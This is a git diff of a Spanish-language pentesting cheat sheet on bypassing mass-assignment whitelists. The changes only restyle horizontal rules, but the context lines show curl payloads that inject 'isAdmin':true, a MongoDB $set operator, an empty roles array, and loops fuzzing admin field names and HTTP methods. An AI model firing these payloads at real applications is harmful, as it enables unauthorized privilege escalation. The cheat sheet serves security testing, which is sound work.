@@ -16,7 +16,7 @@ linked:
 ---
 # Mass Assignment - Bypass de Whitelists
 
-***
+---
 
 ## Nested Object Injection
 
@@ -33,7 +33,7 @@ linked:
 | `curl ... -d '{"$set":{"isAdmin":true}}'` | MongoDB operator nested inject | App pasa body directo a Mongoose. |
 ^ma-bypass-nested
 
-___
+---
 
 ## Array vs Object Polyglot
 
@@ -51,7 +51,7 @@ ___
 | `curl ... -d '{"roles":[]}'` | Array vacío reset roles | Reset to empty bypass restriction. |
 ^ma-bypass-types
 
-___
+---
 
 ## Case Manipulation
 
@@ -70,7 +70,7 @@ ___
 | `for f in isAdmin is_admin IsAdmin IS_ADMIN admin role roles is-admin; do curl ... -d "{\"$f\":true}"; done` | Bulk fuzz convenciones | No conocés naming. |
 ^ma-bypass-case
 
-___
+---
 
 ## HTTP Method Override
 
@@ -87,7 +87,7 @@ ___
 | `for m in PUT PATCH POST DELETE PROPFIND COPY; do curl -X $m ... -d '{"isAdmin":true}'; done` | Method matrix probe | Brute force methods. |
 ^ma-bypass-method
 
-___
+---
 
 ## Query String vs Body
 
@@ -103,4 +103,4 @@ ___
 | `for src in 'query' 'header' 'cookie' 'body' 'form'; do ...; done` | Probe sources | Identificar dónde el server lee. |
 ^ma-bypass-query
 
-***
+---
